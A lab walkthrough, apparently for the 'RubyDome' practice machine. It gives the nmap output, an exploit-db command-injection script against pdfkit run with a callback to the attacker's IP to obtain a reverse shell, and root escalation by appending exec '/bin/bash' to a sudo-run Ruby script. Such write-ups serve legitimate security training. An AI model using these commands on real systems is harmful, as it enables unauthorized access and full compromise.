---
icon: ubuntu
---

# RubyDome - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.224.22 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-04 19:24 EDT
Nmap scan report for 192.168.224.22
Host is up (0.037s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-title: RubyDome HTML to PDF
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   30.29 ms 192.168.45.1
2   30.21 ms 192.168.45.254
3   31.68 ms 192.168.251.1
4   33.66 ms 192.168.224.22
```

### <mark style="color:$primary;">HTTP Port 3000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2406).png" alt=""><figcaption></figcaption></figure>

Let's see if reaches out to our machine

<figure><img src="../../.gitbook/assets/image (2407).png" alt=""><figcaption></figcaption></figure>

It does

<figure><img src="../../.gitbook/assets/image (2408).png" alt=""><figcaption></figcaption></figure>

The application displayed an error revealing sensitive information. From this error, I discovered that the application is using the <mark style="color:$success;">**pdfkit**</mark> library.

Searching for exploits for pdfkit library reveals Command Injection

<figure><img src="../../.gitbook/assets/image (2409).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">pdfkit 0.8.7.2 Command Injection</mark>

Let's download the exploitdb payload and execute it&#x20;

```
searchsploit -m 51293
```

```
python3 51293.py -s 192.168.45.158 3000 -w http://192.168.224.22:3000/pdf -p url
```

<figure><img src="../../.gitbook/assets/image (2410).png" alt=""><figcaption></figcaption></figure>

We got a shell as andrew!

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2411).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Sudo ruby</mark>

<figure><img src="../../.gitbook/assets/image (2412).png" alt=""><figcaption></figcaption></figure>

Andrew is the owner and has the ability to modify its contents!

A quick check on [**GTFObins**](https://gtfobins.github.io/gtfobins/ruby/#shell) reveals an easy privesc

<figure><img src="../../.gitbook/assets/image (2413).png" alt=""><figcaption></figcaption></figure>

Let's append `exec '/bin/bash'`to the script and have it and then execute it to get a shell as root!

```
echo "exec '/bin/bash'" >> app.rb
```

```
sudo /usr/bin/ruby /home/andrew/app/app.rb
```

<figure><img src="../../.gitbook/assets/image (2414).png" alt=""><figcaption></figcaption></figure>

We are root!
